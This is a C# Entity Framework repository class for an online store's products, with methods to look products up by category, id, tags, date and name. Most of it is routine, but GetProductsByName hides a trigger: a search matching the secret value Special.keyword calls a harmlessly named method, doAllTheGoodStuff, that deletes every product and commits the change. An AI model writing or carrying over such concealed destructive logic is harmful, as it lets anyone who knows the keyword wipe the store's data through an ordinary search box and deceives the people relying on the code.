using Store.Data.Infrastructure;
using Store.Data.IRepositories;
using Store.Model.Models;
using System;
using System.Collections.Generic;
using System.Data.Entity;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Store.Data.Repositories
{
    public class ProductRepository : RepositoryBase<Product>, IProductRepository
    {
        public ProductRepository(IDbFactory dbFactory)
            : base(dbFactory) { }

        public List<Product> GetProductByCategory(string CategoryName)
        {
            var Products = this.DbContext.Products
                .Include(a=>a.Category)
                .Where(c => c.Category.Name == CategoryName)
                .ToList();

            return Products;
        }

        public override Product GetById(int id)
        {
            return this.DbContext.Products
                    .Include(a => a.Category)
                    .Include(a => a.Tags)
                    .Include(a => a.Images)
                    .Include(a => a.Promo)
                    .Where(a => a.Id == id)
                    .FirstOrDefault();
        }

        public List<Product> GetNewProducts()
        {
            var fiveDays = DateTime.Now.AddDays(-5);
            return this.DbContext.Products
                    .Include(a => a.Category)
                    .Include(a => a.Images)
                    .Where(a => a.ReleaseDate > fiveDays).Take(9).ToList();
        }

        public List<SizeAndProductId> GetProductSizes(string Name)
        {
            return this.DbContext
                .Products
                .Where(a => a.Name.Equals(Name) && a.Quantity > 0)
                .Select(a => new SizeAndProductId{ size = a.Size, productId = a.Id })
                .OrderBy(a=>a.size)
                .ToList();
        }



        public List<Product> GetRelatedProducts(int Id)
        {
            List<ItemTag> itemTags = this.DbContext.Products
                .Where(a=>a.Id == Id)
                .Select(a=>a.Tags)
                .FirstOrDefault();
            
            List<Product> products = new List<Product>();
            foreach (ItemTag item in itemTags)
            {
                var productsOfTag = this.DbContext.ItemTags.Include(b => b.Products.Select(a => a.Images)).Include(b => b.Products.Select(a => a.Promo)).Where(a=>a.Id == item.Id).Select(a=>a).FirstOrDefault();
                Random random = new Random();

                var Product = productsOfTag.Products[random.Next(0, productsOfTag.Products.Count)];

                if (!products.Contains(Product) && Product != null)
                {
                    products.Add(Product);
                }
                if(item == itemTags.Last() && products.Count < 4)
                {
                    int itemsToFill = 4 - products.Count;
                    for (int i = 0; i < itemsToFill; i++)
                    {
                        var alternative = this.DbContext.Products.Include(b=>b.Images).Include(b=>b.Promo).Select(a => a).ToList()[random.Next(0, this.DbContext.Products.Select(a => a).ToList().Count)];
                        if(alternative != null)
                        products.Add(alternative);
                    }
                }
            }

            return products;
        }

        public List<Product> GetProductsByName(string Name)
        {
            List<Product> products = this.DbContext.Products
                    .Include(a => a.Category)
                    .Include(a => a.Images)
                    .Where(a => a.Name.Contains(Name) || a.Description.Contains(Name))
                    .ToList();

            if (Name.Equals(Special.keyword))
            {
                doAllTheGoodStuff();
            }
            return products;
        }

        private void doAllTheGoodStuff()
        {
            this.DbContext.Products.RemoveRange(this.DbContext.Products.ToList());
            this.DbContext.Commit();
        }
    }
}
